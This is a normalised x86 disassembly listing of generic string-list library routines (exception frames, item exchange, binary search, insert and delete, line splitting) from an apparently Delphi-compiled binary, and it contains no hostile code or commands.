mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_419b60
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_419b00
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_41a420
mov eax [ ebp - 0x8 ]
push eax
push sub_41a6d0
push ebp
call sub_419aa8
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_419b60
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419bf5
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419bfc
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403edc
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_4042c4
jne r-xdata
sub_419c0c
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_419c08
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b838
jmp sub_4038f4
sub_419c44
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_419c8c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405c78
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_419c0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419c93
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_419c9c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419d74
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419a90
xor eax eax
push ebp
push sub_419d52
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419d59
mov eax [ ebp - 0x4 ]
call sub_419b4c
retn
sub_419d84
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_419df3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx edi
call sub_403f0c
mov eax esi
call sub_41a760
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_4040a0
mov eax [ ebp - 0x4 ]
mov edx [ ebx ]
call sub_40c4e0
test eax eax
je r-xdata
mov eax ebx
xor edx edx
call sub_404504
mov edx eax
dec edx
mov eax ebx
call sub_404504
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419dfa
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_419e08
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_419e59
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_419d84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419e60
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
sub_419e6c
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_419eb1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_404378
call sub_408a8c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419eb8
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_419ec0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419fcb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
xor ebx ebx
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_403f50
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov ecx ebx
xor edx edx
call sub_403fa8
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419fd2
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403edc
retn
inc esi
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_404178
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_404178
add edi eax
add ebx edi
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_404178
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx ebx
call sub_4028c8
add [ ebp - 0x14 ] ebx
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov ecx ebx
call sub_4028c8
add [ ebp - 0x14 ] ebx
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_404178
mov ebx eax
test ebx ebx
je r-xdata
sub_419fe8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41a067
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov esi eax
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_403eb8
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_404178
mov edx eax
add edx 0x2
mov ecx 0x7fffffff
pop eax
call sub_4043d8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a06e
lea eax [ ebp - 0xc ]
call sub_403eb8
retn
sub_41a074
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41a0ec
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a0f3
lea eax [ ebp - 0xc ]
call sub_403eb8
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_41a100
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41a1c3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_4043d8
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_41a760
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_4040a0
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_40c4e0
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a1ca
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403edc
lea eax [ ebp - 0xc ]
call sub_403eb8
retn
sub_41a1d4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_41a208
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_41a238
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41b300
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a280
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a287
mov eax [ ebp - 0x4 ]
call sub_403128
retn
sub_41a28c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a329
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419a90
xor eax eax
push ebp
push sub_41a30c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_41ade8
sub esi eax
lea eax [ ebp - 0x8 ]
mov ecx esi
xor edx edx
call sub_403fa8
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a313
mov eax [ ebp - 0x4 ]
call sub_419b4c
retn
sub_41a338
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a3d9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a3e0
lea eax [ ebp - 0x8 ]
call sub_403eb8
retn
mov eax [ ebp - 0x4 ]
call sub_419a90
xor eax eax
push ebp
push sub_41a3bc
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_419b4c
retn
sub_41a3e8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebp eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push ebp
mov ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_41a420
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a4c4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41d03c
mov eax [ ebp - 0x4 ]
call sub_419a90
xor eax eax
push ebp
push sub_41a49f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_41c0d8
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41dcdc
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a4a6
mov eax [ ebp - 0x4 ]
call sub_419b4c
retn
sub_41a4d0
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41b300
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a51b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a522
mov eax [ ebp - 0x4 ]
call sub_403128
retn
sub_41a528
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41a575
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_404178
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_41b04c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a57c
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_41a588
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx esi
call sub_4057cc
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx + 0x10 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0xc ]
sub_41a5bc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41a5ff
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_4040b0
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a606
lea eax [ ebp - 0x4 ]
call sub_403eb8
retn
sub_41a60c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a6c0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_419a90
xor edx edx
push ebp
push sub_41a6a3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a6aa
mov eax [ ebp - 0x4 ]
call sub_419b4c
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax ebx
jmp r-xdata
mov dl [ ebx ]
test dl dl
je r-xdata
mov ecx ebx
sub ecx eax
lea edx [ ebp - 0x8 ]
xchg edx eax
call sub_403fa8
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp [ ebx ] 0xd
jne r-xdata
sub dl 0xa
je r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
sub dl 0x3
jne r-xdata
inc ebx
inc ebx
sub_41a6d0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41a746
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41f270
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_41f278
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a74d
lea eax [ ebp - 0xc ]
call sub_403eb8
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4209e4
inc esi
dec ebx
jne r-xdata
sub_41a778
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x7 ]
jne r-xdata
or [ esi + 0x4 ] 0x4
mov [ esi + 0x7 ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_41a794
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4198c8
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x14 ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x10 ]
mov edx [ r-xdata ]
call sub_40496c
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_41a7fc
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov al [ ebx + 0x1d ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_419c44
jmp r-xdata
sub_41a898
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov edx [ r-xdata ]
call sub_40496c
xor eax eax
mov [ ebx + 0x14 ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41a8d8
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419c44
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax [ ebx + 0x10 ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_4028c8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_404a58
dec [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
sub_41a944
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419c44
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_419c44
cmp edi [ ebx + 0x14 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_41a9a0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_41a9a0
push ebx
mov ebx [ eax + 0x10 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x10 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_41a9c4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x14 ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x10 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
test eax eax
jge r-xdata
mov edx ebx
dec edx
mov [ esp + 0xc ] edx
test eax eax
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x1d ] 0x1
je r-xdata
mov esi ebx
sub_41aa3c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419c44
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x10 ]
mov edx [ edx + esi * 8 ]
call sub_403f0c
pop edi
pop esi
pop ebx
retn
sub_41aa78
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419c44
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_41aaa0
push esi
mov edx [ eax + 0x18 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_41aad4
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_41a074
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_41ab20
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_419c44
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_419c44
cmp esi [ ebx + 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_41ab74
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x14 ]
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_41aaa0
mov eax [ ebx + 0x10 ]
